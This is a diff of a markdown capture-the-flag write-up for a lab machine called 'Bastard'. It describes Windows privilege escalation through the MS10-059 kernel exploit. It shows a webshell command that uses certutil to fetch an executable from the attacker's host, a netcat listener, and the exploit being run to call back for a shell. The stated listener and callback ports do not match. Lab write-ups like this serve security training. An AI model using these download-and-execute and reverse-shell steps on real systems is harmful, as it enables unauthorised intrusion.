@@ -87,13 +87,13 @@ The unserialize function can result in code being loaded and executed. </br> </b
 # Privilege Escalation:
 I used the [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) tool, and found out the machine was vulnerable to MS10-059. </br>
 I found an exploit on [GitHub](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059), I downloaded the ```exploit.exe``` file to my Kali machine, </br>
-and downloaded on the windows machine, using cerutil (I used the webshell from earlier): </br>
+and transferred it to the windows machine, using cerutil (I used the webshell from earlier): </br>
 ```bash
 http://10.10.10.9/test.php?cmd=certutil%20-urlcache%20-split%20-f%20%22http://10.10.14.2/privesc.exe%22%20privesc.exe
 ``` 
-</br>
 
-I used netcat to listen to 1235 port on my Kali Linux: ```nc -nlvp 1235``` , and ran the exploit on the windows machine: ```privesc.exe 10.10.14.2 1234``` </br>
+I used netcat to listen to 1235 port on my Kali Linux: ```nc -nlvp 1235``` , and ran the exploit on the windows machine: </br>
+```privesc.exe 10.10.14.2 1234``` </br>
 [privesc_exploit](images/bastard/privesc_exploit.png) </br>
 [privesc_exploit2](images/bastard/privesc_exploit2.png) </br>
 
